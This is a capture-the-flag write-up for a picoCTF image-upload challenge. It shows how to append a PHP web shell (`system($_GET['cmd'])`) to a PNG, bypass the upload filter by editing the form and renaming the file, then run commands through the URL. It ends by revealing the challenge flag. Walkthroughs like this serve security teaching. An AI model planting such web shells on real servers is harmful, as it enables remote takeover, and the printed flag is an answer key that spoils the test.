## Description

I found a web app that can help process images: PNG images only!
Additional details will be available after launching your challenge instance.

## Solution

1. try navigate to /robots.txt on url. we are going to see interesting file.

```
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```

2. seem _instructions.txt_ is interesting. let navigate to that file on url (http://atlas.picoctf.net:54757/instructions.txt)

```
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```

3. since our webpage allow for upload the .png file only. let see if we can trick the webpage to upload _Arbitrary code execution_. since the file upload _.png_ and the web server is running php, there could be possible chance that we could inject the php code into the image file. let try the following command
   a. echo "<?php phpinfo();?>" >> apple.png
   b. inspect element and allow all type of file upload in the <form> tag
   c. seems application is allow only png file, we could rename the _apple.png_ to _apple.png.php_ since it still valid _.png_ file. when we navigate to the following file upload it will execute the php code
   d. walla we can see the php execute success on the server

4. if we could execute arbitary php code let allow passing command via url (http://atlas.picoctf.net:54757/uploads/apple-1.png.php?cmd=ls)

- inject this following code to the image and upload the new one

```
echo "<?php echo system($_GET['cmd']); ?>" >> apple-1.png
```

- rename the file to apple-1.png.php and reupload again

5. navigte *http://atlas.picoctf.net:54757/uploads/apple-1.png.php?cmd=ls* you could see the list of interesting file:

```
GAZWIMLEGU2DQ.txt
index.php
instructions.txt
robots.txt
uploads
```

6. let check the content of _GAZWIMLEGU2DQ.txt_ by running the following *http://atlas.picoctf.net:54757/uploads/apple-1.png.php?cmd=cat /var/www/html/GAZWIMLEGU2DQ.txt*
7. walla we see the flag: _picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_03d1d548}_
